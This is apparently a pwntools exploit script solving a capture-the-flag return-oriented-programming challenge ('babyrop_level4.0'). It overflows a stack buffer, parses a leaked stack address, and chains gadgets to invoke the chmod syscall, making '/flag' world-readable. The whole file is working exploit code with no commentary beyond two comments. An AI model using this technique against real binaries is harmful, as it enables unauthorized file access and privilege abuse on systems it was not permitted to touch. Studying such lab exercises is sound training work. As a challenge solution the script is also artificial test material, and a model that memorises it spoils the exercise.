from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level4.0')

rop = ROP(elf)
pop_rax = rop.rax.address
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
syscall = rop.syscall.address

p = process("/challenge/babyrop_level4.0")
padding = b"A" * (0x40 + 8)
p.recvuntil(b"located at: ")
leak = int(p.recvuntil(b".")[:-1], 16)

rop.raw(pop_rax)
rop.raw(90)
rop.raw(pop_rdi)
rop.raw(leak + len(padding) + 7*8)
rop.raw(pop_rsi)
rop.raw(511) #chmod mode is in octet
rop.raw(syscall)
# /flag\x00
payload = padding + rop.chain() + b"/flag\x00"

p.send(payload)
print(p.recvall())
p.close()
